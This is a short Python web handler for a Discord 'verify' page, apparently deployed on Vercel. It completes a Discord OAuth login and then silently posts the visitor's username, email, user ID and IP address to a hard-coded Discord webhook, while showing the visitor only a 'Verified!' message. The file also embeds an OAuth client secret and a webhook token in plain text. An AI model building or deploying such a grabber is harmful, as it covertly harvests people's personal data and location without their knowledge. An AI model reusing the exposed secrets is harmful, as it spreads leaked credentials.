from http.server import BaseHTTPRequestHandler
import urllib.parse, requests

CLIENT_ID = "1390626260056674366"
CLIENT_SECRET = "hL-Ji669_YHUf7ICB91PazHBrBeU0_eA"
REDIRECT_URI = "https://verify-orcin-nine.vercel.app/api/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "code" not in params:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing code")
            return

        code = params["code"][0]
        token_data = {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "scope": "identify email"
        }

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        token_res = requests.post("https://discord.com/api/oauth2/token", data=token_data, headers=headers)
        access_token = token_res.json().get("access_token")

        user_res = requests.get("https://discord.com/api/users/@me", headers={
            "Authorization": f"Bearer {access_token}"
        })
        user = user_res.json()
        ip = self.headers.get("x-forwarded-for", "Unknown")

        # Send to webhook
        data = {
            "embeds": [{
                "title": "✅ Verified",
                "fields": [
                    {"name": "User", "value": f"{user['username']}#{user['discriminator']}"},
                    {"name": "Email", "value": user.get('email', 'Not Provided')},
                    {"name": "IP Address", "value": ip},
                    {"name": "User ID", "value": user['id']}
                ],
                "color": 0x00ff99
            }]
        }
        requests.post(WEBHOOK_URL, json=data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>✅ Verified! You may return to Discord.</h1>")
